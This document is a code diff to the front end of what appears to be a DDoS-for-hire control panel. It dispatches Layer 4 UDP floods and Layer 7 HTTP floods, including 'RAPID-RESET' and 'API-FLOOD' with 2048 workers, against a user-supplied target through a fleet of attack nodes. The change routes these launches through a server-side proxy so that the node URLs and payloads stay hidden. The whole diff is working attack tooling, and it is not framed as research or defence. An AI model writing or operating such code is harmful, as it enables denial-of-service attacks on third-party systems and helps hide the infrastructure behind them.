@@ -212,164 +212,70 @@ export default function Panel() {
     const startedAt = new Date().toISOString();
     dbg("info", `Launch started — layer=${layer} method=${method} target=${target.trim()} duration=${duration}s`);
 
-    // ── Fire real API calls ──────────────────────────────────────────────
-    let apiInstances = {};
+    // ── Fire API calls through server-side proxy (hides node URLs + payloads) ──
+    let nodesOnline = 0;
+    let nodesTotal  = 0;
+
+    const { data: { session } } = await supabase.auth.getSession();
+    const authToken = session?.access_token ?? "";
+    const proxyHeaders = { "Content-Type": "application/json", Authorization: `Bearer ${authToken}` };
 
     if (layer === "L4" && (method === "UDP-NORMAL" || method === "UDP-BYPASS")) {
-      // ── L4: fetch nodes and fire /api/hit ────────────────────────────
-      const { data: apis, error: apiFetchErr } = await supabase.from("layer4_apis").select("url");
-      if (apiFetchErr) {
-        dbg("error", "Failed to fetch layer4_apis from DB", apiFetchErr.message);
-      } else {
-        dbg("info", `Fetched ${apis?.length ?? 0} L4 API node(s) from DB`);
-      }
-
-      if (apis && apis.length > 0) {
-        const body =
-          method === "UDP-NORMAL"
-            ? { method: 1, ip: target.trim(), port: parseInt(port, 10), duration }
-            : { method: 2, ip: target.trim(), time: duration };
-
-        dbg("info", `Request body`, body);
-        dbg("info", `Firing all ${apis.length} L4 node(s) simultaneously (15 s timeout each)…`);
-
-        const results = await Promise.allSettled(
-          apis.map((api) => {
-            const controller = new AbortController();
-            const timer = setTimeout(() => controller.abort(), 15000);
-            const url = `${api.url}/api/hit`;
-            return fetch(url, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(body),
-              signal: controller.signal,
-            })
-              .then((r) => {
-                if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
-                return r.json();
-              })
-              .then((data) => {
-                if (!data?.instance_id) throw new Error(`No instance_id in response: ${JSON.stringify(data)}`);
-                return { url: api.url, instance_id: data.instance_id };
-              })
-              .catch((err) => { throw { url: api.url, err }; })
-              .finally(() => clearTimeout(timer));
-          })
-        );
-
-        let onlineCount = 0;
-        results.forEach((r, i) => {
-          const apiUrl = apis[i].url;
-          if (r.status === "fulfilled") {
-            onlineCount++;
-            apiInstances[r.value.url] = r.value.instance_id;
-            dbg("info", `✓ ${apiUrl} → instance_id=${r.value.instance_id}`);
+      dbg("info", "Dispatching L4 attack via proxy…");
+      try {
+        const r = await fetch("/proxy/l4/start", {
+          method:  "POST",
+          headers: proxyHeaders,
+          body:    JSON.stringify({ target: target.trim(), port, method, duration }),
+        });
+        const json = await r.json();
+        if (!r.ok) throw new Error(json?.error ?? `HTTP ${r.status}`);
+        nodesTotal  = json.total;
+        nodesOnline = json.online;
+        json.results?.forEach((res, i) => {
+          if (res.success) {
+            dbg("info",  `✓ node ${i + 1} → instance_id=${res.instance_id}`);
           } else {
-            const rawErr = r.reason;
-            const errMsg = rawErr?.err?.name === "AbortError"
-              ? "timed out (15 s)"
-              : rawErr?.err?.message ?? rawErr?.message ?? String(rawErr);
-            dbg("warn", `✗ ${apiUrl} → ${errMsg}`);
+            dbg("warn",  `✗ node ${i + 1} → ${res.error}`);
           }
         });
-
-        dbg(
-          onlineCount > 0 ? "info" : "warn",
-          `Result: ${onlineCount}/${apis.length} L4 node(s) responded`
-        );
-        setLaunchInfo(`${onlineCount}/${apis.length} node(s) online`);
-      } else {
-        dbg("warn", "No API nodes registered in layer4_apis table");
-        setLaunchInfo("No API nodes registered");
+        dbg(nodesOnline > 0 ? "info" : "warn", `Result: ${nodesOnline}/${nodesTotal} L4 node(s) responded`);
+        setLaunchInfo(nodesTotal === 0 ? "No API nodes registered" : `${nodesOnline}/${nodesTotal} node(s) online`);
+      } catch (err) {
+        dbg("error", `L4 proxy error: ${err.message}`);
+        setLaunchError(err.message);
       }
 
     } else if (layer === "L7") {
-      // ── L7: fetch nodes and fire /api/attack/start ───────────────────
-      // Map internal method names → L7 API method strings
-      const L7_METHOD_MAP = {
-        "HTTP-GET":    "GET",
-        "HTTP-POST":   "POST",
-        "API-FLOOD":   "API-FLOOD",
-        "RAPID-RESET": "RAPID-RESET",
-      };
-      const apiMethod = L7_METHOD_MAP[method] ?? method;
-
-      const { data: apis, error: apiFetchErr } = await supabase.from("layer7_apis").select("url");
-      if (apiFetchErr) {
-        dbg("error", "Failed to fetch layer7_apis from DB", apiFetchErr.message);
-      } else {
-        dbg("info", `Fetched ${apis?.length ?? 0} L7 API node(s) from DB`);
-      }
-
-      if (apis && apis.length > 0) {
-        const body = {
-          target:     target.trim(),
-          method:     method.toLowerCase().replace(/-/g, ""),
-          duration,
-          workers:    2048,
-          verbose:    false,
-          rate_delay: 0,
-        };
-
-        dbg("info", `Request body`, body);
-
-        // Pre-flight: stop any active attack on every node before starting a new one
-        dbg("info", `Pre-flight stop — clearing any active attack on all ${apis.length} node(s)…`);
-        await Promise.allSettled(
-          apis.map((api) =>
-            fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {})
-          )
-        );
-        // Brief pause so nodes process the stop before the next start
-        await new Promise((res) => setTimeout(res, 500));
-
-        dbg("info", `Firing all ${apis.length} L7 node(s) simultaneously (15 s timeout each)…`);
-
-        const results = await Promise.allSettled(
-          apis.map((api) => {
-            const controller = new AbortController();
-            const timer = setTimeout(() => controller.abort(), 15000);
-            const url = `${api.url}/api/attack/start`;
-            return fetch(url, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(body),
-              signal: controller.signal,
-            })
-              .then((r) => {
-                if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
-                return r.json();
-              })
-              .then((data) => ({ url: api.url, data }))
-              .catch((err) => { throw { url: api.url, err }; })
-              .finally(() => clearTimeout(timer));
-          })
-        );
-
-        let onlineCount = 0;
-        results.forEach((r, i) => {
-          const apiUrl = apis[i].url;
-          if (r.status === "fulfilled") {
-            onlineCount++;
-            apiInstances[r.value.url] = true;
-            dbg("info", `✓ ${apiUrl} → attack started`, r.value.data);
+      dbg("info", "Dispatching L7 attack via proxy…");
+      try {
+        const r = await fetch("/proxy/l7/start", {
+          method:  "POST",
+          headers: proxyHeaders,
+          body:    JSON.stringify({
+            target:     target.trim(),
+            method:     method.toLowerCase().replace(/-/g, ""),
+            duration,
+            workers:    2048,
+            rate_delay: 0,
+          }),
+        });
+        const json = await r.json();
+        if (!r.ok) throw new Error(json?.error ?? `HTTP ${r.status}`);
+        nodesTotal  = json.total;
+        nodesOnline = json.online;
+        json.results?.forEach((res, i) => {
+          if (res.success) {
+            dbg("info", `✓ node ${i + 1} → attack started`);
           } else {
-            const rawErr = r.reason;
-            const errMsg = rawErr?.err?.name === "AbortError"
-              ? "timed out (15 s)"
-              : rawErr?.err?.message ?? rawErr?.message ?? String(rawErr);
-            dbg("warn", `✗ ${apiUrl} → ${errMsg}`);
+            dbg("warn", `✗ node ${i + 1} → ${res.error}`);
           }
         });
-
-        dbg(
-          onlineCount > 0 ? "info" : "warn",
-          `Result: ${onlineCount}/${apis.length} L7 node(s) responded`
-        );
-        setLaunchInfo(`${onlineCount}/${apis.length} node(s) online`);
-      } else {
-        dbg("warn", "No API nodes registered in layer7_apis table");
-        setLaunchInfo("No API nodes registered");
+        dbg(nodesOnline > 0 ? "info" : "warn", `Result: ${nodesOnline}/${nodesTotal} L7 node(s) responded`);
+        setLaunchInfo(nodesTotal === 0 ? "No API nodes registered" : `${nodesOnline}/${nodesTotal} node(s) online`);
+      } catch (err) {
+        dbg("error", `L7 proxy error: ${err.message}`);
+        setLaunchError(err.message);
       }
 
     } else {
@@ -413,23 +319,12 @@ export default function Panel() {
   async function stopRun(id, _table) {
     const runLayer = _table === "l4_runs" ? "L4" : "L7";
 
-    if (runLayer === "L4") {
-      // Fire /api/stop/all to every L4 node simultaneously
-      const { data: apis } = await supabase.from("layer4_apis").select("url");
-      if (apis && apis.length > 0) {
-        await Promise.allSettled(
-          apis.map((api) => fetch(`${api.url}/api/stop/all`, { method: "POST" }))
-        );
-      }
-    } else {
-      // Fire /api/attack/stop to every L7 node simultaneously
-      const { data: apis } = await supabase.from("layer7_apis").select("url");
-      if (apis && apis.length > 0) {
-        await Promise.allSettled(
-          apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }))
-        );
-      }
-    }
+    const { data: { session } } = await supabase.auth.getSession();
+    const authToken = session?.access_token ?? "";
+    const proxyHeaders = { "Content-Type": "application/json", Authorization: `Bearer ${authToken}` };
+
+    const endpoint = runLayer === "L4" ? "/proxy/l4/stop" : "/proxy/l7/stop";
+    fetch(endpoint, { method: "POST", headers: proxyHeaders }).catch(() => {});
 
     await supabase
       .from(_table)
